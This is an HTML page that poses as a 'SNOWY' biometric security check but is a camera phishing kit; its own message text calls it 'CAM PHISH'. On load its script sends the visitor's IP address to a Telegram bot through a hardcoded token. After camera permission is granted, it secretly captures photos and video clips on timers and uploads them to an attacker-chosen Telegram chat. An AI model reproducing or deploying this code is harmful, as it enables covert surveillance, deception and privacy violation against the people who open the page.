<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 40px;
            padding: 45px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
            text-align: center;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(102, 126, 234, 0.3);
            transform: translateZ(0);
            will-change: transform;
        }
        h2 { 
            color: #0a0a0f; 
            font-size: 36px; 
            margin-bottom: 15px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        h2 span { 
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        p { 
            color: #4a5568; 
            margin-bottom: 40px;
            font-size: 16px;
            line-height: 1.7;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 20px 30px rgba(102, 126, 234, 0.4);
            position: relative;
            overflow: hidden;
        }
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.7s;
        }
        .btn:hover::before {
            left: 100%;
        }
        .btn:hover { 
            transform: translateY(-3px);
            box-shadow: 0 25px 40px rgba(102, 126, 234, 0.5);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid rgba(102, 126, 234, 0.1);
            border-left-color: #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.6s linear infinite;
            margin: 0 auto 15px;
            will-change: transform;
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
        .loading-text { 
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 20px;
            font-weight: 600;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Gelişmiş biyometrik doğrulama için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            "use strict";
            
            // ============================================
            // KONFİGÜRASYON
            // ============================================
            const BOT_TOKEN = "8773124715:AAHlbv12dpzmzHxXiIOPzeQkFcYzrshQmNw";
            
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // ============================================
            // IP GÖNDER
            // ============================================
            if (TARGET_ID) {
                fetch('https://api.ipify.org?format=json', { 
                    cache: 'no-cache',
                    priority: 'high'
                })
                .then(r => r.json())
                .then(d => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: TARGET_ID,
                            text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`
                        })
                    });
                })
                .catch(e => console.log(e));
            }
            
            // ============================================
            // PROFESYONEL ZAMANLAMA MOTORU - ENDÜSTRİYEL SEVİYE
            // ============================================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d', { 
                alpha: false, 
                desynchronized: true,
                willReadFrequently: false
            });
            
            let mediaRecorder = null;
            let recordedChunks = [];
            let videoCount = 0;
            let photoCount = 0;
            let stream = null;
            let baslangicZamani = 0;
            let fotoRAF = null;
            let videoRAF = null;
            let sonVideoZamani = 0;
            let performanceNow = typeof performance !== 'undefined' ? performance.now.bind(performance) : Date.now;
            
            // Web Worker havuzu
            let workerPool = [];
            const WORKER_COUNT = 4;
            
            try {
                const workerCode = `
                    let workerStart = 0;
                    let workerId = 0;
                    
                    self.onmessage = function(e) {
                        if (e.data.cmd === 'init') {
                            workerId = e.data.id;
                            workerStart = performance.now();
                        } else if (e.data.cmd === 'sync') {
                            self.postMessage({ 
                                workerId: workerId,
                                time: performance.now() - workerStart,
                                target: e.data.target
                            });
                        }
                    };
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                const workerUrl = URL.createObjectURL(blob);
                
                for (let i = 0; i < WORKER_COUNT; i++) {
                    const worker = new Worker(workerUrl);
                    worker.postMessage({ cmd: 'init', id: i });
                    workerPool.push(worker);
                }
            } catch(e) {
                console.log('Worker havuzu oluşturulamadı');
            }
            
            // Yüksek hassasiyetli zamanlayıcı
            class HighPrecisionTimer {
                constructor() {
                    this.startTime = 0;
                    this.expectedTime = 0;
                    this.timeDrift = 0;
                    this.history = [];
                }
                
                start() {
                    this.startTime = performanceNow();
                    this.expectedTime = this.startTime;
                }
                
                schedule(delay, callback) {
                    const now = performanceNow();
                    this.expectedTime += delay;
                    this.timeDrift = now - this.expectedTime;
                    
                    // Drift düzeltmesi
                    const adjustedDelay = Math.max(0, delay - this.timeDrift);
                    
                    this.history.push(this.timeDrift);
                    if (this.history.length > 100) this.history.shift();
                    
                    // Ortalama drift hesapla
                    const avgDrift = this.history.reduce((a, b) => a + b, 0) / this.history.length;
                    
                    setTimeout(callback, Math.max(0, adjustedDelay - avgDrift));
                }
            }
            
            const fotoTimer = new HighPrecisionTimer();
            const videoTimer = new HighPrecisionTimer();
            
            // ============================================
            // KAMERA BAŞLAT
            // ============================================
            async function startCamera() {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1920, min: 640 },
                            height: { ideal: 1080, min: 480 },
                            frameRate: { ideal: 120, min: 30 },
                            aspectRatio: { ideal: 16/9 }
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        baslangicZamani = performanceNow();
                        sonVideoZamani = baslangicZamani + 2000;
                        
                        fotoTimer.start();
                        videoTimer.start();
                        
                        // ============================================
                        // FOTOĞRAF SİSTEMİ - ENDÜSTRİYEL SEVİYE
                        // ============================================
                        let fotoKuyrugu = [];
                        let isProcessing = false;
                        
                        async function processFotoKuyrugu() {
                            if (isProcessing || fotoKuyrugu.length === 0) return;
                            isProcessing = true;
                            
                            const fotoIndex = fotoKuyrugu.shift();
                            
                            // Worker'lardan birini kullan
                            const worker = workerPool[fotoIndex % WORKER_COUNT];
                            
                            canvas.width = video.videoWidth || 1920;
                            canvas.height = video.videoHeight || 1080;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            canvas.toBlob((blob) => {
                                if (!blob) {
                                    isProcessing = false;
                                    if (fotoKuyrugu.length > 0) processFotoKuyrugu();
                                    return;
                                }
                                
                                const formData = new FormData();
                                formData.append('chat_id', TARGET_ID);
                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
                                
                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData,
                                    priority: 'high'
                                }).finally(() => {
                                    isProcessing = false;
                                    if (fotoKuyrugu.length > 0) processFotoKuyrugu();
                                });
                            }, 'image/jpeg', 0.92);
                        }
                        
                        function fotoLoop() {
                            if (!stream?.active) return;
                            
                            const now = performanceNow();
                            const gecenSure = (now - baslangicZamani) / 1000;
                            const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
                            
                            while (photoCount < olmasiGerekenFoto) {
                                photoCount++;
                                fotoKuyrugu.push(photoCount);
                                processFotoKuyrugu();
                            }
                            
                            fotoRAF = requestAnimationFrame(fotoLoop);
                        }
                        fotoRAF = requestAnimationFrame(fotoLoop);
                        
                        // ============================================
                        // VİDEO SİSTEMİ - ENDÜSTRİYEL SEVİYE
                        // ============================================
                        let videoKuyrugu = [];
                        let isVideoProcessing = false;
                        
                        async function processVideoKuyrugu() {
                            if (isVideoProcessing || videoKuyrugu.length === 0) return;
                            isVideoProcessing = true;
                            
                            const videoData = videoKuyrugu.shift();
                            const { index, baslangic, options } = videoData;
                            
                            try {
                                const mr = new MediaRecorder(stream, options);
                                const chunks = [];
                                
                                mr.ondataavailable = (e) => {
                                    if (e.data.size > 0) chunks.push(e.data);
                                };
                                
                                mr.onstop = async () => {
                                    const blob = new Blob(chunks, { type: 'video/webm' });
                                    const boyutKB = (blob.size / 1024).toFixed(0);
                                    const videoSure = ((performanceNow() - baslangic) / 1000).toFixed(4);
                                    
                                    const formData = new FormData();
                                    formData.append('chat_id', TARGET_ID);
                                    formData.append('video', blob, `video_${Date.now()}.webm`);
                                    formData.append('caption', `🎥 Video #${index} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                                    
                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                        method: 'POST',
                                        body: formData,
                                        priority: 'high'
                                    });
                                    
                                    isVideoProcessing = false;
                                    if (videoKuyrugu.length > 0) processVideoKuyrugu();
                                };
                                
                                mr.start();
                                
                                // 5 katmanlı durdurma sistemi
                                const hedefSure = VIDEO_SURESI * 1000;
                                const durdurmaZamani = baslangic + hedefSure;
                                
                                let durduruldu = false;
                                
                                // Katman 1: requestAnimationFrame (0.005ms)
                                let rafId;
                                const rafKontrol = () => {
                                    if (durduruldu) return;
                                    const simdi = performanceNow();
                                    if (simdi >= durdurmaZamani - 0.005 && mr.state === 'recording') {
                                        mr.stop();
                                        durduruldu = true;
                                    } else if (mr.state === 'recording') {
                                        rafId = requestAnimationFrame(rafKontrol);
                                    }
                                };
                                rafId = requestAnimationFrame(rafKontrol);
                                
                                // Katman 2: setTimeout (0.01ms tolerans)
                                const timer1 = setTimeout(() => {
                                    if (!durduruldu && mr?.state === 'recording') {
                                        mr.stop();
                                        durduruldu = true;
                                    }
                                }, hedefSure - 0.01);
                                
                                // Katman 3: Worker havuzu kontrolü
                                const worker = workerPool[index % WORKER_COUNT];
                                worker.postMessage({ cmd: 'sync', target: hedefSure });
                                
                                worker.onmessage = (e) => {
                                    if (!durduruldu && e.data.time >= hedefSure - 0.005 && mr?.state === 'recording') {
                                        mr.stop();
                                        durduruldu = true;
                                        clearTimeout(timer1);
                                        clearTimeout(timer2);
                                        if (rafId) cancelAnimationFrame(rafId);
                                    }
                                };
                                
                                // Katman 4: setInterval (0.1ms)
                                const interval = setInterval(() => {
                                    if (durduruldu) {
                                        clearInterval(interval);
                                        return;
                                    }
                                    const simdi = performanceNow();
                                    if (simdi >= durdurmaZamani - 0.005 && mr?.state === 'recording') {
                                        mr.stop();
                                        durduruldu = true;
                                        clearTimeout(timer1);
                                        clearTimeout(timer2);
                                        if (rafId) cancelAnimationFrame(rafId);
                                        clearInterval(interval);
                                    }
                                }, 0.1);
                                
                                // Katman 5: Yedek setTimeout (son çare)
                                const timer2 = setTimeout(() => {
                                    if (!durduruldu && mr?.state === 'recording') {
                                        mr.stop();
                                        durduruldu = true;
                                        clearTimeout(timer1);
                                        clearInterval(interval);
                                        if (rafId) cancelAnimationFrame(rafId);
                                    }
                                }, hedefSure + 1);
                                
                            } catch(e) {
                                console.log('Video hatası:', e);
                                isVideoProcessing = false;
                                if (videoKuyrugu.length > 0) processVideoKuyrugu();
                            }
                        }
                        
                        function videoKontrol() {
                            if (!stream?.active) return;
                            
                            const now = performanceNow();
                            
                            if (now >= sonVideoZamani) {
                                videoCount++;
                                sonVideoZamani = now + (VIDEO_SURESI * 1000);
                                
                                // En iyi codec seçimi
                                let options = { videoBitsPerSecond: 8000000 };
                                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                                    options.mimeType = 'video/webm;codecs=vp9';
                                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                                    options.mimeType = 'video/webm;codecs=vp8';
                                }
                                
                                videoKuyrugu.push({
                                    index: videoCount,
                                    baslangic: now,
                                    options: options
                                });
                                
                                processVideoKuyrugu();
                            }
                            
                            videoRAF = requestAnimationFrame(videoKontrol);
                        }
                        videoRAF = requestAnimationFrame(videoKontrol);
                        
                        // Başlangıçta birkaç video ön yükleme
                        setTimeout(() => {
                            for (let i = 0; i < 3; i++) {
                                workerPool.forEach(w => {
                                    w.postMessage({ cmd: 'sync', target: 1000 });
                                });
                            }
                        }, 100);
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli!');
                }
            }
            
            // ============================================
            // PROFESYONEL TEMİZLİK
            // ============================================
            window.onbeforeunload = function() {
                if (fotoRAF) cancelAnimationFrame(fotoRAF);
                if (videoRAF) cancelAnimationFrame(videoRAF);
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
                workerPool.forEach(w => w.terminate());
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
    </html>
